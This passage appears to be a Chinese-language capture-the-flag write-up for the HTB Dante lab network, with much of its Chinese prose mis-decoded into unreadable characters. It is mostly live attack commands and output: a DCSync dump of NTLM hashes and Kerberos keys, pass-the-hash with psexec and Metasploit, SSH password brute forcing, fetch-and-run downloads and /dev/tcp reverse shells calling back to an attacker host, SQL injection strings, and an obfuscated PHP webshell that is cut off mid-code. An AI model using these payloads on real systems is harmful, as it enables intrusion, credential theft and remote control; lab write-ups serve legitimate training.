<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> proxychains_1088.conf secretsdump.py <span class="nt">-outputfile</span> 172.16.2.5_DCSync DANTE.ADMIN/jbercov:myspace7@172.16.2.5
</code></pre></div></div>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c:::
DANTE.ADMIN<span class="se">\j</span>bercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c:::
DANTE-DC02<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:698534680cb407112e87a196bccb2e1f:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
Administrator:des-cbc-md5:8ac752cea84f4a10
krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46
krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36
krbtgt:des-cbc-md5:dcbff8a80b5b343e
DANTE.ADMIN<span class="se">\j</span>bercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6
DANTE.ADMIN<span class="se">\j</span>bercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d
DANTE.ADMIN<span class="se">\j</span>bercov:des-cbc-md5:c7e08938cb7f929d
DANTE-DC02<span class="nv">$:</span>aes256-cts-hmac-sha1-96:ad70e34f55fb662789158a2a9fd111aa2042a651e518e5e83b8592c35d9f3bce
DANTE-DC02<span class="nv">$:</span>aes128-cts-hmac-sha1-96:4c917008232d55247ef311d89437a078
DANTE-DC02<span class="nv">$:</span>des-cbc-md5:b5497fb9eac17f5d
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
</code></pre></div></div>
<h2 id="ææƒ-hash-ä¼ é€’">ææƒ: Hash ä¼ é€’</h2>
<p>æœ‰äº† Administrator çš„ Hash ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Pass the Hash æ¥è·å– Administrator æƒé™ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> proxychains_1088.conf psexec.py <span class="nt">-hashes</span> <span class="s1">'aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8'</span> <span class="s1">'DANTE.ADMIN/Administrator@172.16.2.5'</span>

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 172.16.2.5.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file kvzbKpgP.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 172.16.2.5.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service fuZm on 172.16.2.5.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service fuZm.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1490]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; 
</code></pre></div></div>

<p>c:\Users\Administrator\Desktop ä¸‹æœ‰ flag.txt å’Œ Note.txtï¼ŒNote.txt å†…å®¹å¦‚ä¸‹ï¼Œæç¤ºæˆ‘ä»¬å…¶å®å¯ä»¥é€šè¿‡æšä¸¾ DC01 çš„æµè§ˆå™¨è®°å½•æ¥æ‰¾åˆ° 172.16.2.0/24 ç½‘æ®µã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You were supposed to find this subnet via enumerating the browser <span class="nb">history </span>files on DC01.

172.16.1.10 can also pivot to this box, it may be a bit more stable than DC01.
</code></pre></div></div>
<p>c:\Users\Administrator\Documents ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª Jenkins.bat æ–‡ä»¶ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user Admin_129834765 SamsungOctober102030 /add
</code></pre></div></div>
<p>å¾—åˆ°äº†ä¸€ä¸ªç”¨æˆ·å‡­è¯ï¼Œå¯èƒ½ä¸ 172.16.1.19 ä¸­çš„ jenkins æœ‰å…³ã€‚</p>

<p>é™¤äº†ä½¿ç”¨ impacket ä¸­çš„ psexec.py å¤–ï¼Œmsf ä¸­ä¹Ÿé›†æˆäº†æ¨¡å—åˆ©ç”¨ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/psexec
<span class="nb">set </span>rhosts 172.16.2.5
<span class="nb">set </span>proxies socks5:127.0.0.1:1088
<span class="nb">set </span>smbuser Administrator
<span class="nb">set </span>SMBPass aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
<span class="nb">set </span>lhost 10.10.14.5
<span class="nb">set </span>reverseallowproxy <span class="nb">true
set </span>DisablePayloadHandler <span class="nb">true
set </span>payload windows/x64/meterpreter/reverse_tcp
<span class="nb">set </span>LPORT 1235
run
</code></pre></div></div>

<h2 id="ä¸»æœºå­˜æ´»æ€§æ‰«æ-1">ä¸»æœºå­˜æ´»æ€§æ‰«æ</h2>
<p>å¾—åˆ°åŸŸæ§æƒé™åï¼Œå¯ä»¥è¿›ä¸€æ­¥æ¢æµ‹ 172.16.2.0/24 ç½‘æ®µå­˜æ´»çš„ä¸»æœºã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kr">for</span><span class="w"> </span><span class="n">/L</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="n">ping</span><span class="w"> </span><span class="nx">/n</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">/w</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">172.16.2.</span><span class="o">%</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="s2">"Reply"</span><span class="w">

</span><span class="n">Reply</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">172.16.2.5:</span><span class="w"> </span><span class="nx">bytes</span><span class="o">=</span><span class="mi">32</span><span class="w"> </span><span class="n">time</span><span class="err">&lt;</span><span class="nx">1ms</span><span class="w"> </span><span class="nx">TTL</span><span class="o">=</span><span class="mi">128</span><span class="w">
</span><span class="n">Reply</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">172.16.2.101:</span><span class="w"> </span><span class="nx">bytes</span><span class="o">=</span><span class="mi">32</span><span class="w"> </span><span class="n">time</span><span class="err">&lt;</span><span class="nx">1ms</span><span class="w"> </span><span class="nx">TTL</span><span class="o">=</span><span class="mi">64</span><span class="w">
</span></code></pre></div></div>
<p>172.16.2.0/24 é™¤äº†åŸŸæ§åªæœ‰ 172.16.2.101 è¿™å°ä¸»æœº</p>

<h1 id="linux-172162101">Linux: 172.16.2.101</h1>
<h2 id="ç«¯å£æ‰«æ-1">ç«¯å£æ‰«æ</h2>
<p>åœ¨ 172.16.2.5 ä½¿ç”¨ msf å¯¹ 172.16.2.101 è¿›è¡Œç«¯å£æ‰«æ</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/portscan/tcp
<span class="nb">set </span>RHOSTS 172.16.2.101
<span class="nb">set </span>THREADS 10
run
</code></pre></div></div>
<p>ä»…å¼€æ”¾ä¸€ä¸ª ssh æœåŠ¡</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] 172.16.2.101:         - 172.16.2.101:22 - TCP OPEN
</code></pre></div></div>

<h2 id="ssh-çˆ†ç ´">SSH çˆ†ç ´</h2>
<p>msf ä¸­å¯ä»¥ä½¿ç”¨ auxiliary/scanner/ssh/ssh_login æ¨¡å—æ¥çˆ†ç ´ ssh</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/ssh/ssh_login
<span class="nb">set </span>USERPASS_FILE /project/HTB/ProLab/Dante/combine_msf.txt
<span class="nb">set </span>RHOSTS 172.16.2.101
<span class="nb">set </span>VERBOSE <span class="nb">true
set </span>ThREADS 10
run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.2.101:22 - Starting bruteforce
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'asmith:Princess1'</span>
<span class="o">[!]</span> No active DB <span class="nt">--</span> Credential data will not be saved!
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'smoggat:Summer2019'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'tmodle:P45678!'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'ccraven:Password1'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'kploty:Teacher65'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'jbercov:4567Holiday1'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'whaguey:acb123'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'dcamtan:WorldOfWarcraft67'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'tspadly:RopeBlackfieldForwardslash'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'ematlis:JuneJuly1TY'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'fglacdon:FinalFantasy7'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'tmentrso:65RedBalloons'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'dharding:WestminsterOrange5'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'smillar:MarksAndSparks91'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'bjohnston:Bullingdon1'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'iahmed:Sheffield23'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'plongbottom:PowerfixSaturdayClub777'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'jcarrot:Tanenbaum0001'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'lgesley:SuperStrongCantForget123456789'</span>
<span class="o">[</span>+] 172.16.2.101:22 - Success: <span class="s1">'julian:manchesterunited'</span> <span class="s1">'uid=1001(julian) gid=1001(julian) groups=1001(julian) Linux DANTE-ADMIN-NIX05 5.4.0-39-generic #43-Ubuntu SMP Fri Jun 19 10:28:31 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH session 5 opened <span class="o">(</span>10.10.14.5-10.10.110.3:57306 -&gt; 172.16.2.101:22<span class="o">)</span> at 2024-01-01 20:49:15 <span class="nt">-0500</span>

</code></pre></div></div>
<p>ç™»é™†æˆåŠŸä¹‹å msf ä¼šè‡ªåŠ¨æ‰“å¼€ä¸€ä¸ª ssh session</p>

<h2 id="ææƒè‡³-root-polkitcve-2021-3560">ææƒè‡³ root: polkit:CVE-2021-3560</h2>
<p>ä½¿ç”¨ linPEAS è¿›è¡Œææƒä¿¡æ¯æ”¶é›†</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># linPEAS</span>
nc <span class="nt">-lvnp</span> 9002 | <span class="nb">tee </span>linpeas.out <span class="c">#Host</span>
wget <span class="nt">-q</span> <span class="nt">-O-</span> 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 <span class="c">#Victim</span>
</code></pre></div></div>

<p>åå¼¹ä¸€ä¸ª shell åˆ° pwncatï¼Œæ–¹ä¾¿ä¸Šä¼ ä¸‹è½½æ–‡ä»¶ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.5/9897 0&gt;&amp;1
</code></pre></div></div>

<p>Dante é¶åœºå¯èƒ½æ¯”è¾ƒè€äº†ï¼ŒåŸºæœ¬ä¸Š linux ææƒéƒ½å¯ä»¥ç”¨ polkit:CVE-2021-3560 æ‰“é€šï¼Œä¸Šä¼  trator å¯ä»¥ç›´æ¥ææƒåˆ° rootã€‚</p>

<h2 id="ææƒ-suid-æ–‡ä»¶æº¢å‡ºæ¼æ´ææƒ">ææƒ: SUID æ–‡ä»¶æº¢å‡ºæ¼æ´ææƒ</h2>
<p>linPEAS ç»“æœæ–‡ä»¶ä¸­å…³äº SUID æ–‡ä»¶çš„æè¿°å­˜åœ¨å¦‚ä¸‹çš„ä¸€ä¸ªæ¡ç›®ï¼Œreadfile å¹¶ä¸æ˜¯ linux åŸç”Ÿçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-rwsr-sr-x</span> 1 root julian 17K Jun 30  2020 /usr/sbin/readfile <span class="o">(</span>Unknown SUID binary!<span class="o">)</span>
</code></pre></div></div>
<p>åŸæ€è·¯æ˜¯åˆ©ç”¨ readfile ä¸­å­˜åœ¨çš„æº¢å‡ºæ¼æ´ææƒè‡³ rootã€‚</p>

<h2 id="ä¸»æœºå­˜æ´»æ€§æ¢æµ‹">ä¸»æœºå­˜æ´»æ€§æ¢æµ‹</h2>
<p>å†åœ¨ 172.16.2.101 ä¸­ä½¿ç”¨ ping æ¢æµ‹ä¸»æœºå­˜æ´»æ—¶ï¼Œå¯ä»¥é¢å¤–æ‰«å‡ºæ¥ä¸€ä¸ª 172.16.2.6ï¼Œæ­¤å‰åœ¨ 172.16.2.5 ä¸­æ²¡æœ‰æ‰«æå‡ºè¯¥ä¸»æœºçš„åŸå› å¯èƒ½åœ¨äºé˜²ç«å¢™ç­–ç•¥çš„é™åˆ¶ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..255<span class="o">}</span><span class="p">;</span><span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.16.2.<span class="nv">$i</span> | <span class="nb">grep</span> <span class="s2">"bytes from"</span>|cut <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f4</span>|tr <span class="nt">-d</span> <span class="s1">':'</span> &amp;<span class="o">)</span><span class="p">;</span><span class="k">done

</span>172.16.2.5
172.16.2.6
172.16.2.101
</code></pre></div></div>
<h2 id="åå¼¹-msf-meterpreter">åå¼¹ msf meterpreter</h2>
<p>ä¸ºäº†è¿›ä¸€æ­¥æ¸—é€ 172.16.2.6ï¼Œæˆ‘ä»¬å¯ä»¥åå¼¹ä¸€ä¸ª msf meterpreterã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">-q</span> <span class="nt">-O-</span> 10.10.14.5:9999/downloader.sh|bash
</code></pre></div></div>
<p>downloader.sh å†…å®¹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
wget <span class="nt">-q</span> http://10.10.14.5:9999/test <span class="nt">-O</span> .te
<span class="nb">chmod</span> +x .te
<span class="nb">nohup</span> ./.te &amp;
</code></pre></div></div>
<p>åœ¨æ–°è·å–çš„ meterpreter ä¸­æ·»åŠ è·¯ç”±ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run autoroute <span class="nt">-s</span> 172.16.2.6
</code></pre></div></div>
<h1 id="linux-1721626">Linux: 172.16.2.6</h1>
<h2 id="ç«¯å£æ‰«æ-2">ç«¯å£æ‰«æ</h2>
<p>åœ¨ 172.16.2.101 ä½¿ç”¨ msf å¯¹ 172.16.2.6 è¿›è¡Œç«¯å£æ‰«æ</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/portscan/tcp
<span class="nb">set </span>RHOSTS 172.16.2.6
<span class="nb">set </span>THREADS 10
run
</code></pre></div></div>
<p>172.16.2.6 ä¹ŸåŒæ ·ä»…å¼€æ”¾ 22 ç«¯å£ã€‚</p>

<p>ä½¿ç”¨ julian:manchesterunited å¯ä»¥æˆåŠŸç™»é™†ã€‚</p>
<h2 id="ssh-çˆ†ç ´-1">SSH çˆ†ç ´</h2>
<p>åŒæ ·å¯ä»¥ SSH çˆ†ç ´ï¼Œä¸‹é¢çš„ä¸¤ä¸ªå‡­è¯å‡å¯ä»¥æ­£å¸¸ç™»é™†</p>
<ul>
  <li>plongbottom:PowerfixSaturdayClub777</li>
  <li>julian:manchesterunited</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/ssh/ssh_login
<span class="nb">set </span>USERPASS_FILE /project/HTB/ProLab/Dante/combine_msf.txt
<span class="nb">set </span>RHOSTS 172.16.2.6
<span class="nb">set </span>VERBOSE <span class="nb">true
set </span>ThREADS 10
run

<span class="o">[</span>+] 172.16.2.6:22 - Success: <span class="s1">'plongbottom:PowerfixSaturdayClub777'</span> <span class="s1">'uid=1000(plongbottom) gid=1000(plongbottom) groups=1000(plongbottom),27(sudo) Linux DANTE-ADMIN-NIX06 5.3.0-61-generic #55~18.04.1-Ubuntu SMP Mon Jun 22 16:40:20 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH session 7 opened <span class="o">(</span>10.10.14.5-10.10.110.3:42542 -&gt; 172.16.2.6:22<span class="o">)</span> at 2024-01-01 21:43:33 <span class="nt">-0500</span>
<span class="o">[</span>-] 172.16.2.6:22 - Failed: <span class="s1">'jcarrot:Tanenbaum0001'</span>
<span class="o">[</span>-] 172.16.2.6:22 - Failed: <span class="s1">'lgesley:SuperStrongCantForget123456789'</span>
<span class="o">[</span>+] 172.16.2.6:22 - Success: <span class="s1">'julian:manchesterunited'</span> <span class="s1">'uid=1001(julian) gid=1001(julian) groups=1001(julian) Linux DANTE-ADMIN-NIX06 5.3.0-61-generic #55~18.04.1-Ubuntu SMP Mon Jun 22 16:40:20 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH session 8 opened <span class="o">(</span>10.10.14.5-10.10.110.3:46782 -&gt; 172.16.2.6:22<span class="o">)</span> at 2024-01-01 21:43:56 <span class="nt">-0500</span>
</code></pre></div></div>

<p>msf ä¼šè‡ªåŠ¨åå¼¹ shellï¼Œä½†è¿™ä¸ª shell ä¸æ˜¯å¾ˆç¨³å®šï¼Œåå¼¹åˆ° pwncat æ—¶å‡ºç° time outï¼Œå¯èƒ½æ˜¯æœ‰é˜²ç«å¢™</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.5/9897 0&gt;&amp;1

<span class="nt">-bash</span>: connect: Connection timed out
<span class="nt">-bash</span>: line 5: /dev/tcp/10.10.14.5/9896: Connection timed out
</code></pre></div></div>

<p>å¯ä»¥è€ƒè™‘ç›´æ¥åœ¨ 172.16.2.101 ä¸­ä½¿ç”¨ ssh ç™»é™† 172.16.2.6</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh plongbottom@172.16.2.6
</code></pre></div></div>
<h2 id="è·å–-sql-å‡­è¯">è·å– SQL å‡­è¯</h2>
<p>julian çš„ home ç›®å½•å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª flag å’Œä¸€ä¸ª SQL æ–‡ä»¶ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DANTE-ADMIN-NIX06:/home/julian/Desktop# <span class="nb">cat </span>SQL 
Hi Julian
I<span class="s1">'ve put this on your personal desktop as its probably the most secure 
place on the network!

Can you please ask Sophie to change her SQL password when she logs in
again? I'</span>ve reset it to TerrorInflictPurpleDirt996655 as it stands, but
obviously this is a tough one to remember

Maybe we should all get password managers?

Thanks,
James

</code></pre></div></div>
<p>å¯ä»¥è·å–åˆ°ä¸€ä¸ª sql å‡­è¯ï¼š</p>
<ul>
  <li>Sophie/TerrorInflictPurpleDirt996655</li>
</ul>

<h2 id="ææƒ-sudoers">ææƒ: sudoers</h2>
<p>plongbottom ç”¨æˆ·å±äº sudoersï¼Œå› æ­¤å¯ä»¥ç›´æ¥ su ææƒã€‚</p>

<p>æ³¨æ„ msf è·å–çš„åå‘ shell æ— æ³•ä½¿ç”¨ ttyï¼Œsudo ä¼šæŠ¥é”™ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
<span class="nb">sudo</span>: no <span class="nb">tty </span>present and no askpass program specified
</code></pre></div></div>

<h1 id="windows-17216113">Windows: 172.16.1.13</h1>
<p>å¼€æ”¾ç«¯å£ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.1.13	80
172.16.1.13	443
172.16.1.13	445
</code></pre></div></div>

<h2 id="80-ç«¯å£-rce">80 ç«¯å£ RCE</h2>
<p>80 ç«¯å£éƒ¨ç½²äº†ä¸€ä¸ª XAMPPã€‚/phpinfo.php å¯ä»¥è®¿é—® phpinfoã€‚/phpmyadmin åªèƒ½é€šè¿‡æœ¬æœº IP è¿›è¡Œç™»é™†ã€‚</p>

<p>çˆ†ç ´ web ç›®å½•å¯ä»¥å¾—åˆ°ï¼š</p>
<ol>
  <li>/cgi-bin/printenv.pl å¯ä»¥è¾“å‡ºä¸€äº›ç¯å¢ƒä¿¡æ¯ã€‚</li>
  <li>/discuss å¯ä»¥è¿›å…¥ä¸€ä¸ª Dante Technical Discussion Forum é¡µé¢ã€‚</li>
</ol>

<p>é¡µé¢æä¾›äº†æ³¨å†ŒåŠŸèƒ½ï¼Œå¯ä»¥æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç™»é™†ä¹‹åå¯ä»¥ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹ç•Œé¢å­˜åœ¨ sql æ³¨å…¥ã€‚</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># country è¿”å› 1
un=dr34d&amp;fn=dr34d&amp;pwd=dr34d&amp;e_mail=dr34d%40gmail.com&amp;gender=1&amp;dob=1987-08-21&amp;ima=images.jpeg&amp;add=USA&amp;sta=USA&amp;cou=USA'or+1=1#

# country è¿”å› 0
un=dr34d&amp;fn=dr34d&amp;pwd=dr34d&amp;e_mail=dr34d%40gmail.com&amp;gender=1&amp;dob=1987-08-21&amp;ima=images.jpeg&amp;add=USA&amp;sta=USA&amp;cou=USA'or+1=1#
</code></pre></div></div>
<p>å¹¶ä¸”å¦‚æœå¯¹ /discuss/ ç›®å½•è¿›è¡Œæ‰«æï¼Œå¯ä»¥å‘ç° /discuss/db/ï¼Œå¯ç›´æ¥ä¸‹è½½æ•°æ®åº“æ–‡ä»¶ tech_forum.sqlã€‚</p>

<p>æœ€åå‘ç°å­˜åœ¨å†å²æ¼æ´ï¼š</p>
<ul>
  <li><a href="https://www.exploit-db.com/exploits/48512">Online Discussion Forum Site 1.0 - Remote Code Execution - PHP webapps Exploit</a></li>
</ul>

<p>æ³¨å†Œçš„æ—¶å€™å¯ä»¥ä¸Šä¼ ä¸€ä¸ª webshellã€‚ä¸Šä¼ æˆåŠŸåè¿›è¡Œç™»é™†ï¼Œç„¶åå¯ä»¥åœ¨ /ups/ ç›®å½•ä¸‹è®¿é—®ã€‚</p>

<p>ç®€å•çš„ eval webshell ä¼šè¢«æ€ï¼Œä½†æ€è½¯å¹¶ä¸å¼ºï¼Œgodzilla PHP_XOR_BASE64 å¯ä»¥æ­£å¸¸ä¸Šä¼ ã€‚</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nf">error_rfsting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">function</span> <span class="n">encode</span><span class="p">(</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$D</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$K</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span>
        <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$c</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$D</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$pass</span><span class="o">=</span><span class="s1">'pass'</span><span class="p">;</span>
<span class="nv">$payloadName</span><span class="o">=</span><span class="s1">'payload'</span><span class="p">;</span>
<span class="nv">$key</span><span class="o">=</span><span class="s1">'3c6e0b8a9c15224a'</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$pass</span><span class="p">])){</span>
    <span class="nv">$data</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$pass</span><span class="p">]),</span><span class="nv">$key</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">])){</span>
        <span class="nv">$payload</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">],</span><span class="nv">$key</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="s2">"getBasicsInfo"</span><span class="p">)</span><span class="o">===</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$payload</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
        <span class="p">}</span>
                <span class="k">eval</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="mf">.</span><span class="nv">$key</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nf">encode</span><span class="p">(</span><span class="o">@</span><span class="nf">run</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="nv">$key</span><span class="p">));</span>
        <span class="k">echo</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="mf">.</span><span class="nv">$key</span><span class="p">),</span><span class="mi">16</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="s2">"getBasicsInfo"</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
